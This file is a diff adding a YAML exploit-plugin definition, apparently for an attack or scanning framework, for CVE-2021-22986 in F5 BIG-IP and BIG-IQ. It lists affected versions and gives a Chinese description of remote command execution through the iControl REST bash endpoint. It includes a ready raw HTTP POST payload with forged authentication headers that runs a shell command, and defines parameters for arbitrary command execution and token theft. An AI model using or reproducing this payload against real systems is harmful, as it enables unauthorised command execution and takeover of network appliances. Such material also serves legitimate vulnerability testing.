@@ -1,0 +1,33 @@
+info:
+    app: F5
+    name: CVE_2021_22986
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2021-03-19"
+    create_date: "2024-10-06 07:12:56"
+    update_date: "2024-10-06 07:12:56"
+    scope: |-
+        F5 BIG-IP 16.0.0-16.0.1
+        F5 BIG-IP 15.1.0-15.1.2
+        F5 BIG-IP 14.1.0-14.1.3.1
+        F5 BIG-IP 13.1.0-13.1.3.5
+        F5 BIG-IP 12.1.0-12.1.5.2
+
+        F5 BIG-IQ 7.1.0-7.1.0.2
+        F5 BIG-IQ 7.0.0-7.0.0.1
+        F5 BIG-IQ 6.0.0-6.1.0
+    description: BIG-IP存在代码执行漏洞，该漏洞允许定义身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及替换服务。该中断只能通过控制界面利用，而不能通过数据界面利用。
+    vul_id: CVE-2021-22986
+    detail: "输入 https://x.x.x.x \n命令执行:\n\tURI /mgmt/tm/util/bash 输入命令即可执行\n信息获取:\n\tURI /mgmt/shared/authn/login 可获取admin的token，添加到header后即可绕过验证"
+    payload: "POST /mgmt/tm/util/bash HTTP/1.1\nHost: x.x.x.x\nConnection: close\nContent-Length: 41\nCache-Control: max-age=0\nAuthorization: Basic YWRtaW46QVNhc1M=\nX-F5-Auth-Token: \nUpgrade-Insecure-Requests: 1\nContent-Type: application/json\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+payloads:
+    - name: getmsg
+      alias: 获取信息
+    - name: cmd
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: ""
+            required: true
